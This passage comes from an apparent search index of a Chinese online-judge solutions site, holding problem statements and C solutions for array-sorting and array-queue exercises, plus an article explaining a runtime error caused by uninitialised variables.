\u4e14\u4e0e\u8fd910\u4e2a\u6574\u6570\u4e2d\u7684\u4efb\u4e00\u4e2a\u6570\u76f8\u540c\uff0c\u5219\u5220\u6389\u4e0ea\u76f8\u540c\u7684 \u8fd9\u4e2a\u6570\uff0c\u5e76\u5c06\u5269\u4e0b\u76849\u4e2a\u6570\u6309\u5347\u5e8f\u6392\u5e8f\u8f93\u51fa\uff1b \u82e5a\u4e3a\u5076\u6570\uff0c \u4e14\u4e0e\u8fd910\u4e2a\u6570\u90fd\u4e0d\u540c\uff0c\u5219\u52a0\u5165a\uff0c\u5e76\u5c06\u8fd911\u4e2a\u6570\u964d\u5e8f\u6392 \u5e8f\u8f93\u51fa\uff1b \u5426\u5219\uff0c\u5219\u5c06\u8fd910\u4e2a\u6570\u5947\u6570\u5728\u524d\uff0c\u5076\u6570\u5728\u540e\uff0c \u964d\u5e8f\u6392\u5217\u8f93\u51fa\u3002 \u4f8b\u5982\uff0c10\u4e2a\u6570\u5206\u522b\u4e3a6\uff0c89\uff0c34\uff0c12\uff0c 0\uff0c-8\uff0c78\uff0c15\uff0c9\uff0c3. \u82e5a\u4e3a9\uff0c\u5219\u8f93\u51fa\u4e3a\uff1a-8\uff0c0\uff0c3\uff0c 6\uff0c12\uff0c15\uff0c34\uff0c78\uff0c89. \u82e5a\u4e3a2\uff0c\u5219\u8f93\u51fa\u4e3a\uff1a89\uff0c78\uff0c 34\uff0c15\uff0c12\uff0c9\uff0c6\uff0c3\uff0c2\uff0c0\uff0c-8. \u82e5a\u4e3a7\u6216\u800512\uff0c\u5219 \u8f93\u51fa\u4e3a\uff1a89\uff0c15\uff0c9\uff0c3\uff0c78\uff0c34\uff0c12\uff0c6\uff0c0\uff0c-8. \u8981\u6c42\uff1a\u4f7f\u7528\u51fd\u6570\u89e3\u51b3\u672c\u9898\uff0c\u81f3\u5c11\u7f16\u5199\u4ee5\u4e0b\u51e0\u4e2a\u51fd\u6570\uff0c 1\u3001\u5347\u5e8f\u6392\u5e8f\u51fd\u6570void sort(int a[], int n)\uff1b 2\u3001\u67e5\u627e\u51fd\u6570int find(int a[],int n,int value)----\u5728\u5927\u5c0f\u4e3an\u7684a\u6570\u7ec4\u4e2d\u67e5\u627e\u503c\u4e3avalue\u7684\u5143\u7d20\uff0c\u627e\u5230\u5c31\u8fd4\u56de\u5143\u7d20\u7684\u4e0b\u6807\uff0c\u627e\u4e0d\u5230\uff0c\u5c31\u8fd4\u56de-1\uff1b 3\u3001\u8f93\u51fa\u51fd\u6570display(int a[], int n)---\u9010\u4e2a\u8f93\u51fa\u6570\u7ec4a\u7684\u5143\u7d20\uff1b 4\u3001\u53cd\u8f6c\u6570\u7ec4\u51fd\u6570void reverse(int a[], int n)----\u5c06\u6570\u7ec4\u9006\u5e8f\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/uooc/1334/#_3","text":"\u6d4b\u8bd5\u6570\u636e\u7684\u7ec4\u6570n \u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u768410\u4e2a\u6574\u6570 \u7b2c\u4e00\u7ec4\u7684\u6574\u6570a \u7b2c\u4e8c\u7ec4\u6d4b\u8bd5\u6570\u636e\u768410\u4e2a\u6574\u6570 \u7b2c\u4e8c\u7ec4\u7684\u6574\u6570a ...... \u7b2cn\u7ec4\u6d4b\u8bd5\u6570\u636e\u768410\u4e2a\u6574\u6570 \u7b2cn\u7ec4\u7684\u6574\u6570a","title":"\u8f93\u5165"},{"location":"szu_oj/uooc/1334/#_4","text":"\u7b2c\u4e00\u7ec4\u6570\u636e\u6392\u5e8f\u8f93\u51fa \u7b2c\u4e8c\u7ec4\u6570\u636e\u6392\u5e8f\u8f93\u51fa ....... \u7b2cn\u7ec4\u6570\u636e\u6392\u5e8f\u8f93\u51fa","title":"\u8f93\u51fa"},{"location":"szu_oj/uooc/1334/#_5","text":"1 2 3 4 5 6 7 3 6 89 34 12 0 - 8 78 15 9 3 9 6 89 34 12 0 - 8 78 15 9 3 2 6 89 34 12 0 - 8 78 15 9 3 7","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/uooc/1334/#_6","text":"1 2 3 - 8 0 3 6 12 15 34 78 89 89 78 34 15 12 9 6 3 2 0 - 8 89 15 9 3 78 34 12 6 0 - 8","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/uooc/1334/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/uooc/1334/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 #include <stdio.h> #define FAILED_FIND_IN_ARRAY -1 struct Array { int data [ 16 ]; int size ; }; void scanToArray ( struct Array * array ); int findInArray ( struct Array * array , int data ); void sortArray ( struct Array * array ); void reverseArray ( struct Array * array ); void sortArrayInOddAndEven ( struct Array * array ); void printArray ( struct Array * array ); int main () { int ctrl ; scanf ( \"%d\" , & ctrl ); while ( ctrl -- ) { struct Array array = {}; scanToArray ( & array ); int number ; scanf ( \"%d\" , & number ); if ( number % 2 != 0 && findInArray ( & array , number ) != FAILED_FIND_IN_ARRAY ) { array . size -= 1 ; for ( int i = findInArray ( & array , number ); i < array . size ; ++ i ) { array . data [ i ] = array . data [ i + 1 ]; } sortArray ( & array ); } else if ( number % 2 == 0 && findInArray ( & array , number ) == FAILED_FIND_IN_ARRAY ) { array . data [ array . size ] = number ; array . size += 1 ; sortArray ( & array ); reverseArray ( & array ); } else { sortArrayInOddAndEven ( & array ); } printArray ( & array ); } return 0 ; } void scanToArray ( struct Array * array ) { array -> size = 10 ; for ( int i = 0 ; i < array -> size ; ++ i ) { scanf ( \"%d\" , & array -> data [ i ]); } } int findInArray ( struct Array * array , int data ) { for ( int i = 0 ; i < array -> size ; ++ i ) { if ( array -> data [ i ] == data ) { return i ; } } return - 1 ; } void sortArray ( struct Array * array ) { for ( int i1 = 0 ; i1 < array -> size - 1 ; ++ i1 ) { for ( int i2 = 0 ; i2 < array -> size - 1 - i1 ; ++ i2 ) { if ( array -> data [ i2 ] > array -> data [ i2 + 1 ]) { int data = array -> data [ i2 ]; array -> data [ i2 ] = array -> data [ i2 + 1 ]; array -> data [ i2 + 1 ] = data ; } } } } void reverseArray ( struct Array * array ) { for ( int i = 0 ; i < array -> size / 2 ; ++ i ) { int data = array -> data [ i ]; array -> data [ i ] = array -> data [ array -> size - 1 - i ]; array -> data [ array -> size - 1 - i ] = data ; } } void sortArrayInOddAndEven ( struct Array * array ) { struct Array odd = {}, even = {}; for ( int i = 0 ; i < array -> size ; ++ i ) { if ( array -> data [ i ] % 2 == 0 ) { even . data [ even . size ] = array -> data [ i ]; even . size += 1 ; } else { odd . data [ odd . size ] = array -> data [ i ]; odd . size += 1 ; } } sortArray ( & odd ); reverseArray ( & odd ); sortArray ( & even ); reverseArray ( & even ); for ( int i = 0 ; i < odd . size ; ++ i ) { array -> data [ i ] = odd . data [ i ]; } for ( int i = 0 ; i < even . size ; ++ i ) { array -> data [ i + odd . size ] = even . data [ i ]; } } void printArray ( struct Array * array ) { printf ( \"%d\" , array -> data [ 0 ]); for ( int i = 1 ; i < array -> size ; ++ i ) { printf ( \" %d\" , array -> data [ i ]); } printf ( \" \\n \" ); }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/uooc/1438/","text":"\u9e21\u86cb\u961f\u5217\uff08\u6570\u7ec4\uff0c\u51fd\u6570\uff09 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5c06\u4e24\u6839\u7b77\u5b50\u5e73\u884c\u7684\u653e\u5728\u4e00\u8d77\uff0c\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u961f\u5217\u3002\u5c06\u5e26\u6709\u7f16\u53f7\u7684\u9e21\u86cb\u653e\u5230\u4e24\u6839\u7b77\u5b50\u4e4b\u95f4\u53eb\u505a\u5165\u961f(push)\uff0c\u5c06\u7b77\u5b50\u4e4b\u95f4\u7684\u9e21\u86cb\u62ff\u51fa\u6765\u53eb\u505a\u51fa\u961f(pop)\u3002\u4f46\u8fd9\u4e24\u79cd\u65b9\u5f0f\u6709\u7279\u6b8a\u7684\u5b9a\u4e49\uff0c\u5bf9\u4e8e\u5165\u961f\uff0c\u53ea\u80fd\u5c06\u9e21\u86cb\u4ece\u961f\u5217\u7684\u5c3e\u90e8\u5411\u91cc\u653e\u5165\uff1b\u5bf9\u4e8e\u51fa\u961f\uff0c\u53ea\u80fd\u5c06\u9e21\u86cb\u4ece\u961f\u5217\u7684\u5934\u90e8\u5411\u5916\u5c06\u9e21\u86cb\u62ff\u51fa\u6765\u3002 \u5c06\u2460\u3001\u2461\u5165\u961f\uff1a 1 2 3 \u5934 ____________\u5c3e _____________ ______________ \u2190 \u2460 \u2190 \u2461 \u2460 \u2190 \u2461 \u2460 \u2461 ______________ _____________ ______________ \u5c06\u2460\u3001\u2461\u51fa\u961f\uff1a 1 2 3 \u5934 ____________\u5c3e ______________ ______________ \u2190 \u2460 \u2190 \u2461 \u2460 \u2190 \u2461 \u2460 \u2461 ______________ ______________ ______________ \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6570T\uff0c\u8868\u793a\u6709T\u7ec4\u6570\u636e \u7b2c\u4e8c\u884c\u8f93\u5165\u4e00\u4e2a\u6570N\uff0c\u8868\u793a\u6709N(N<=10)\u79cd\u64cd\u4f5c \u63a5\u4e0b\u6765N\u884c\uff0c\u6bcf\u884c\u4e00\u79cd\u64cd\u4f5c\uff0cpush\u8868\u793a\u5c06\u7f16\u53f7\u4e3ax\u7684\u9e21\u86cb\u653e\u5165\u961f\u5217\u4e2d\uff0cpop\u8868\u793a\u62ff\u8d70\u961f\u5217\u5934\u90e8\u7684\u4e00\u4e2a\u9e21\u86cb\u3002 \u6570\u636e\u8f93\u5165\u4fdd\u8bc1\u5408\u6cd5,\u961f\u5217\u4e2d\u6ca1\u6709\u9e21\u86cb\u65f6\u4e0d\u4f1a\u6709\u51fa\u961f\u64cd\u4f5c\uff01 \u8f93\u51fa \u8f93\u51faN\u79cd\u64cd\u4f5c\u5b8c\u4e4b\u540e\uff0c\u961f\u5217\u4e2d\u86cb\u86cb\u7684\u7f16\u53f7\uff0c\u5982\u679c\u6ca1\u86cb\u4e86\uff0c\u5c31\u8f93\u51fa\"no eggs!\"(\u4e0d\u5305\u62ec\u5f15\u53f7)\u6bcf\u7ec4\u8f93\u51fa\u5360\u4e00\u884c\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 2 3 push 1 push 2 push 3 2 push 1 pop \u6837\u4f8b\u8f93\u51fa 1 2 1 2 3 no eggs ! \u63d0\u793a \u6570\u7ec4\u6a21\u62df\u961f\u5217\uff0c\u7528\u4e0b\u6807\u8bb0\u5f55\u5bf9\u5934\u3001\u961f\u5c3e\u4f4d\u7f6e\u3002 \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include <stdio.h> struct Queue { int data [ 32 ]; int head , tail ; }; void push ( struct Queue * queue , int data ); void pop ( struct Queue * queue ); void show ( struct Queue * queue ); int main () { int ctrl ; scanf ( \"%d\" , & ctrl ); while ( ctrl -- ) { struct Queue queue = {}; int time ; scanf ( \"%d\" , & time ); while ( time -- ) { char operation [ 8 ]; scanf ( \"%s\" , operation ); if ( operation [ 1 ] == 'u' ) { int data ; scanf ( \"%d\" , & data ); push ( & queue , data ); } else { pop ( & queue ); } } show ( & queue ); } return 0 ; } void push ( struct Queue * queue , int data ) { queue -> data [ queue -> tail ] = data ; queue -> tail += 1 ; } void pop ( struct Queue * queue ) { queue -> head += 1 ; } void show ( struct Queue * queue ) { if ( queue -> head == queue -> tail ) { printf ( \"no eggs! \\n \" ); } else { printf ( \"%d\" , queue -> data [ queue -> head ]); for ( int i = queue -> head + 1 ; i != queue -> tail ; ++ i ) { printf ( \" %d\" , queue -> data [ i ]); } printf ( \" \\n \" ); } }","title":"\u9e21\u86cb\u961f\u5217\uff08\u6570\u7ec4\uff0c\u51fd\u6570\uff09"},{"location":"szu_oj/uooc/1438/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u9e21\u86cb\u961f\u5217\uff08\u6570\u7ec4\uff0c\u51fd\u6570\uff09"},{"location":"szu_oj/uooc/1438/#_2","text":"\u5c06\u4e24\u6839\u7b77\u5b50\u5e73\u884c\u7684\u653e\u5728\u4e00\u8d77\uff0c\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u961f\u5217\u3002\u5c06\u5e26\u6709\u7f16\u53f7\u7684\u9e21\u86cb\u653e\u5230\u4e24\u6839\u7b77\u5b50\u4e4b\u95f4\u53eb\u505a\u5165\u961f(push)\uff0c\u5c06\u7b77\u5b50\u4e4b\u95f4\u7684\u9e21\u86cb\u62ff\u51fa\u6765\u53eb\u505a\u51fa\u961f(pop)\u3002\u4f46\u8fd9\u4e24\u79cd\u65b9\u5f0f\u6709\u7279\u6b8a\u7684\u5b9a\u4e49\uff0c\u5bf9\u4e8e\u5165\u961f\uff0c\u53ea\u80fd\u5c06\u9e21\u86cb\u4ece\u961f\u5217\u7684\u5c3e\u90e8\u5411\u91cc\u653e\u5165\uff1b\u5bf9\u4e8e\u51fa\u961f\uff0c\u53ea\u80fd\u5c06\u9e21\u86cb\u4ece\u961f\u5217\u7684\u5934\u90e8\u5411\u5916\u5c06\u9e21\u86cb\u62ff\u51fa\u6765\u3002 \u5c06\u2460\u3001\u2461\u5165\u961f\uff1a 1 2 3 \u5934 ____________\u5c3e _____________ ______________ \u2190 \u2460 \u2190 \u2461 \u2460 \u2190 \u2461 \u2460 \u2461 ______________ _____________ ______________ \u5c06\u2460\u3001\u2461\u51fa\u961f\uff1a 1 2 3 \u5934 ____________\u5c3e ______________ ______________ \u2190 \u2460 \u2190 \u2461 \u2460 \u2190 \u2461 \u2460 \u2461 ______________ ______________ ______________","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/uooc/1438/#_3","text":"\u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6570T\uff0c\u8868\u793a\u6709T\u7ec4\u6570\u636e \u7b2c\u4e8c\u884c\u8f93\u5165\u4e00\u4e2a\u6570N\uff0c\u8868\u793a\u6709N(N<=10)\u79cd\u64cd\u4f5c \u63a5\u4e0b\u6765N\u884c\uff0c\u6bcf\u884c\u4e00\u79cd\u64cd\u4f5c\uff0cpush\u8868\u793a\u5c06\u7f16\u53f7\u4e3ax\u7684\u9e21\u86cb\u653e\u5165\u961f\u5217\u4e2d\uff0cpop\u8868\u793a\u62ff\u8d70\u961f\u5217\u5934\u90e8\u7684\u4e00\u4e2a\u9e21\u86cb\u3002 \u6570\u636e\u8f93\u5165\u4fdd\u8bc1\u5408\u6cd5,\u961f\u5217\u4e2d\u6ca1\u6709\u9e21\u86cb\u65f6\u4e0d\u4f1a\u6709\u51fa\u961f\u64cd\u4f5c\uff01","title":"\u8f93\u5165"},{"location":"szu_oj/uooc/1438/#_4","text":"\u8f93\u51faN\u79cd\u64cd\u4f5c\u5b8c\u4e4b\u540e\uff0c\u961f\u5217\u4e2d\u86cb\u86cb\u7684\u7f16\u53f7\uff0c\u5982\u679c\u6ca1\u86cb\u4e86\uff0c\u5c31\u8f93\u51fa\"no eggs!\"(\u4e0d\u5305\u62ec\u5f15\u53f7)\u6bcf\u7ec4\u8f93\u51fa\u5360\u4e00\u884c\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/uooc/1438/#_5","text":"1 2 3 4 5 6 7 8 2 3 push 1 push 2 push 3 2 push 1 pop","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/uooc/1438/#_6","text":"1 2 1 2 3 no eggs !","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/uooc/1438/#_7","text":"\u6570\u7ec4\u6a21\u62df\u961f\u5217\uff0c\u7528\u4e0b\u6807\u8bb0\u5f55\u5bf9\u5934\u3001\u961f\u5c3e\u4f4d\u7f6e\u3002","title":"\u63d0\u793a"},{"location":"szu_oj/uooc/1438/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include <stdio.h> struct Queue { int data [ 32 ]; int head , tail ; }; void push ( struct Queue * queue , int data ); void pop ( struct Queue * queue ); void show ( struct Queue * queue ); int main () { int ctrl ; scanf ( \"%d\" , & ctrl ); while ( ctrl -- ) { struct Queue queue = {}; int time ; scanf ( \"%d\" , & time ); while ( time -- ) { char operation [ 8 ]; scanf ( \"%s\" , operation ); if ( operation [ 1 ] == 'u' ) { int data ; scanf ( \"%d\" , & data ); push ( & queue , data ); } else { pop ( & queue ); } } show ( & queue ); } return 0 ; } void push ( struct Queue * queue , int data ) { queue -> data [ queue -> tail ] = data ; queue -> tail += 1 ; } void pop ( struct Queue * queue ) { queue -> head += 1 ; } void show ( struct Queue * queue ) { if ( queue -> head == queue -> tail ) { printf ( \"no eggs! \\n \" ); } else { printf ( \"%d\" , queue -> data [ queue -> head ]); for ( int i = queue -> head + 1 ; i != queue -> tail ; ++ i ) { printf ( \" %d\" , queue -> data [ i ]); } printf ( \" \\n \" ); } }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/what_s_wrong_with_my_code/first/","text":"\u8fd9\u6b21\u6211\u4eec\u5f00\u4e2a\u4e13\u9898\uff0c\u4e13\u95e8\u6765\u8c08\u8c08\u5404\u4f4d\u5927\u4f6c\u4eec\u559c\u6b22\u8bf4\u7684\u4e00\u53e5\u8bdd\uff1a \u672c\u5730\u8fc7\u4e86\u5c31\u662f\u8fc7\u4e86\uff0c\u63d0\u793a\u9519\u8bef\u8bf4\u660eOJ\u6709\u95ee\u9898\u3002 \u4e8b\u5b9e\u679c\u771f\u5982\u6b64\u5417\uff1f \u5927\u4e00\u5230\u73b0\u5728\uff0c\u770b\u8fc7\u597d\u591a\u540c\u5b66\u7684\u4ee3\u7801\uff0c\u4e8b\u5b9e\u8bc1\u660e\uff0c\u5728\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u95ee\u9898\u90fd\u662f\u51fa\u5728\u5404\u4f4d\u5927\u4f6c\u4eec\u8eab\u4e0a\u3002\u6211\u77e5\u9053\u5927\u4f6c\u4eec\u90fd\u559c\u6b22\u8bf4\u81ea\u5df1\u770b\u8fc7\u8bf8\u5982C Primer Plus\u4e4b\u7c7b\u7684\u4e66\u7c4d\uff0c\u6765\u6807\u699c\u81ea\u5df1\u5b66\u8bc6\u6bd4\u8f83\u6e0a\u535a\u8fd9\u4e2a\u6837\u5b50\u3002/*\u8fd9\u6837\u5e72\u597d\u50cf\u4e5f\u6ca1\u4ec0\u4e48\u6bdb\u75c5\uff0c\u6bd5\u7adf\u67d0\u4e9b\u6559\u6750\u786e\u5b9e\u4e0d\u600e\u4e48\u6837\u3002*/\u4e0d\u8fc7\u8bf4\u5230\u8fd9\u4e2a...\u6211\u633a\u60f3\u8bf4\u7684\u662f\uff1a \u5404\u4f4d\u5927\u4f6c\u7684\u5f00\u53d1\u73af\u5883\u662f\u4ec0\u4e48\uff1f\u76f8\u6bd4\u4e8e\u8bb0\u4e8b\u672c\uff0c\u5b83\u662f\u5426\u80fd\u6709\u6548\u5730\u63d0\u9ad8\u4f60\u7684\u751f\u4ea7\u529b\uff1f\u5b83\u662f\u5426\u80fd\u6307\u51fa\u4e00\u4e9b\u4ee3\u7801\u8d28\u91cf\u65b9\u9762\u7684\u95ee\u9898\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8econst\u3001reference\uff1f \u4f60\u662f\u5426\u6ca1\u6709\u9009\u62e9\u6027\u5730\u5ffd\u7565\u4e86\u4e00\u4e9b\u8b66\u544a\uff1f\u662f\u5426\u601d\u8003\u8fc7\u4e3a\u4f55\u4f1a\u51fa\u73b0\u8fd9\u4e9b\u8b66\u544a\uff1f \u9047\u5230\u4e86\u95ee\u9898\uff0c\u4f60\u662f\u9009\u62e9\u5229\u7528gdb\u3001Clang-Tidy\u7b49\u5de5\u5177\u6765\u5e2e\u52a9\u4f60\u3001\u5229\u7528Google\u5bfb\u627e\u6b63\u786e\u7684\u7b54\u6848\uff0c\u8fd8\u662f\u6577\u884d\u4e86\u4e8b\uff1f \u6211\u89c9\u5f97\u5728\u5b66\u4e60\u9636\u6bb5\uff0c\u91cd\u8981\u7684\u662f\u517b\u6210\u826f\u597d\u7684\u4e60\u60ef\uff0c\u800c\u4e0d\u662f\u56eb\u56f5\u541e\u67a3\uff0c\u7cca\u5f04OJ\u3001\u7cca\u5f04\u4f5c\u4e1a\u3001\u7cca\u5f04\u8003\u8bd5\u3002\u65e2\u7136\u90fd\u8981\u5b66\uff0c\u90a3\u4e3a\u5565\u4e0d\u52aa\u529b\u628a\u5b83\u5b66\u597d\u5462\uff1f \u5bf9\u4e86\uff0c\u8981\u8bf4\u660e\u7684\u662f\uff0c\u6211\u73b0\u5728\u4f3c\u4e4e\u5df2\u7ecf\u5f88\u96be\u6536\u96c6\u90a3\u4e48\u591a\u5408\u9002\u7684\u6848\u4f8b\u6765\u5206\u6790\u4e86\uff0c\u4e0d\u8fc7\u6211\u4f1a\u5c3d\u91cf\u53bb\u505a\uff0c\u5e0c\u671b\u8fd9\u5bf9\u4e8e\u4f60\u6709\u6240\u5e2e\u52a9\u3002\u53e6\u5916\uff0c\u5982\u679c\u6709\u4efb\u4f55\u9519\u8bef\uff0c\u6b22\u8fce\u6307\u51fa\u3002","title":"\u524d\u8a00"},{"location":"szu_oj/what_s_wrong_with_my_code/initialize/","text":"\u5176\u5b9e\u8fd9\u7bc7\u6587\u7ae0\u6700\u65e9\u7684\u65f6\u5019\u662f\u60f3\u8ba8\u8bba\u4e00\u4e0b\uff0c\u4e3a\u4ec0\u4e48\u6709\u7684\u540c\u5b66\u628a\u4ee3\u7801\u91cc\u7684\u53d8\u91cf\u79fb\u52a8\u4e86\u4e00\u4e0b\u4f4d\u7f6e\uff0c\u5728OJ\u91cc\u5c31\u4e0d\u4f1a\u518d\u51fa\u73b0\u8fd0\u884c\u9519\u8bef\u7684\u95ee\u9898\u3002\u4f46\u662f\u6211\u80fd\u627e\u5230\u7684\u8fd9\u4e2a\u4f8b\u5b50\u5374\u4e0d\u592a\u597d...\u56e0\u4e3a\u5b83...\u5728\u6211\u5199\u6587\u7ae0\u7684\u65f6\u5019\uff0c\u4e0d\u80fd\u590d\u73b0\u5f53\u65f6\u7684\u60c5\u51b5\u4e86...\u5f53\u65f6\u5927\u6982\u662f\u8fd9\u6837\u7684\uff1a \u67d0\u5929\u4e0b\u5348\u6211\u6b63\u5728\u673a\u623f\u89d2\u843d\u64b8\u4ee3\u7801\uff0c\u90a3\u4e2a\u65f6\u5019\u4e5f\u4e0b\u8bfe\u540c\u5b66\u90fd\u8d70\u5f97\u5dee\u4e0d\u591a\u4e86\u3002\u7a81\u7136\u542c\u5230\u6709\u4eba\u8bf4\uff1a \u4f60\u770b\u6211\u628a\u8fd9\u4e2a\u53d8\u91cf\u653e\u4e0a\u9762\u8fc7\u4e0d\u4e86\uff0c\u653e\u5230\u4e0b\u9762\u5c31AC\u4e86\uff01 \u81f3\u4e8e\u8fd9\u4f4d\u540c\u5b66\u6709\u6ca1\u6709\u8bf4OJ\u6709\u95ee\u9898\u6211\u662f\u4e0d\u8bb0\u5f97\u4e86\uff0c\u4e0d\u8fc7\u6211\u5f53\u65f6\u5c31\u53bbPY\u4e86\u4e00\u4efd\u8fd9\u4e2a\u540c\u5b66\u7684\u4ee3\u7801\u8fd8\u6709\u540e\u53f0\u7684\u6570\u636e\u6765\u770b\u770b\uff1a \u9898\u76ee\u662f\u8fd9\u6837\u7684\uff1a \u7f16\u5199\u51fd\u6570void find(int *num,int n,int &minIndex,int &maxIndex)\uff0c\u6c42\u6570\u7ec4num(\u5143\u7d20\u4e3anum[0]\uff0cnum[1]\uff0c...\uff0cnum[n-1]\uff09\u4e2d\u53d6\u6700\u5c0f\u503c\u3001\u6700\u5927\u503c\u7684\u5143\u7d20\u4e0b\u6807minIndex,maxIndex\uff08\u82e5\u6709\u76f8\u540c\u6700\u503c\uff0c\u53d6\u7b2c\u4e00\u4e2a\u51fa\u73b0\u7684\u4e0b\u6807\u3002\uff09 \u8f93\u5165n\uff0c\u52a8\u6001\u5206\u914dn\u4e2a\u6574\u6570\u7a7a\u95f4\uff0c\u8f93\u5165n\u4e2a\u6574\u6570\uff0c\u8c03\u7528\u8be5\u51fd\u6570\u6c42\u6570\u7ec4\u7684\u6700\u5c0f\u503c\u3001\u6700\u5927\u503c\u4e0b\u6807\u3002\u6700\u540e\u6309\u6837\u4f8b\u683c\u5f0f\u8f93\u51fa\u7ed3\u679c\u3002 \u6765\u770b\u770b\u8fd9\u4f4d\u540c\u5b66\u7684\u4ee3\u7801\uff0c\u6211\u6709\u628a\u4ee3\u7801\u653e\u5230CLion\u91cc\u683c\u5f0f\u5316\u4e86\u4e00\u4e0b\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include <iostream> using namespace std ; void find ( int * num , int n , int & minIndex , int & maxIndex ); int main () { int t , n ; cin >> t ; while ( t -- ) { int max , min ; cin >> n ; int * a = new int [ n ]; for ( int i = 0 ; i < n ; i ++ ) cin >> a [ i ]; find ( a , n , min , max ); cout << \"min=\" << a [ min ] << \" \" << \"minindex=\" << min << endl ; cout << \"max=\" << a [ max ] << \" \" << \"maxindex=\" << max << endl << endl ; } } void find ( int * num , int n , int & minIndex , int & maxIndex ) { int i , max = num [ 0 ], min = num [ 0 ]; for ( i = 0 ; i < n ; i ++ ) { if ( num [ i ] < min ) { min = num [ i ]; minIndex = i ; } if ( num [ i ] > max ) { max = num [ i ]; maxIndex = i ; } } } \u8fd9\u4e2a\u9898\u76ee\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u627e\u4e00\u4e0b\u4e00\u4e2a\u6570\u7ec4\u91cc\u9762\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u7684\u7d22\u5f15\u800c\u5df2\u3002\u6d4b\u8bd5\u6837\u4f8b\u8f93\u5165\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u4e0d\u8fc7\u5230\u4e86\u540e\u53f0\u6570\u636e\u7684\u65f6\u5019... \u9760...\u5199\u5230\u8fd9\u91cc\u7684\u65f6\u5019\u624d\u53d1\u73b0PY\u6765\u7684\u540e\u53f0\u6570\u636e\u4e0d\u77e5\u9053\u88ab\u6211\u5f52\u6863\u5230\u54ea\u91cc\u4e86...\u8fd8\u597d\u6709Everything... \u770b\u8d77\u6765\u90fd\u662f\u5f88\u7b80\u5355\u7684\u6570\u636e\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a\u5bf9\u4e8e\u8fd9\u4e2a\u7a0b\u5e8f\u6765\u8bf4\u5374\u9690\u85cf\u7740\u5de8\u5927\u7684\u5a01\u80c1\uff1a \u9047\u5230\u8fd9\u79cd\u60c5\u51b5\u6211\u4e00\u822c\u4f1adebug\u6765\u770b\u770b\u8fd9\u4e2a\u65f6\u5019\u7684\u7ffb\u8f66\u73b0\u573a\u662f\u600e\u4e48\u6837\u7684\uff1a \u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u80fd\u5f88\u660e\u663e\u5730\u53d1\u73b0\u95ee\u9898\u6240\u5728\u4e86\uff0c\u53d8\u91cfmin\u7684\u6570\u503c\u8fdc\u8fdc\u5730\u8d85\u8fc7\u4e86\u6570\u7ec4\u53ef\u7d22\u5f15\u7684\u8303\u56f4\u3002\u8fd9\u662f\u4e3a\u4f55\uff1f\u4ece\u5934\u5f00\u59cb\u5355\u6b65\u8c03\u8bd5\u5c31\u53ef\u4ee5\u53d1\u73b0\uff1a\u5c40\u90e8\u53d8\u91cfmax\u3001min\u672a\u88ab\u521d\u59cb\u5316\uff0c\u8fd9\u4e2a\u65f6\u5019\u53d8\u91cf\u7684\u503c\u662f\u4e0d\u786e\u5b9a\u7684\u3002\u4f46\u66f4\u7cdf\u7cd5\u7684\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u4f8b\u5982\u6570\u7ec4\u5355\u8c03\u9012\u589e\u6216\u9012\u51cf\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u8bd5\u56fe\u66f4\u65b0maxIndex\u6216minIndex\uff0c\u8fd9\u5c06\u5bfc\u81f4\u7a0b\u5e8f\u5728\u8f93\u51fa\u9636\u6bb5\u4f7f\u7528\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\uff0c\u6240\u4ee5\u5c31\u51fa\u73b0\u4e86Runtime Error\u3002 